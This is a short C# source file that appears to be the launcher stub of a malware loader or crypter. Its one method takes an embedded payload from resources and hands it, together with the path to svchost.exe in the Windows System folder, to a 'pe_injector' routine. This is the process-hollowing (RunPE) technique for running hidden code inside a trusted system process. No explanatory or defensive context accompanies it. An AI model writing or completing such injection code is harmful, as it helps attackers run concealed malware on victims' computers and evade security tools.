using System;
using System.IO;

namespace A
{
    public class class1
    {
        public static void method1()
        {
            byte[] Payload = ResourceGetter.GetPayload();
            
            string sysPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string winLogonPath = Path.Combine(sysPath, "svchost.exe");

            pe_injector.RunExecRoutine(Payload, winLogonPath, string.Empty);
        }
    }
}
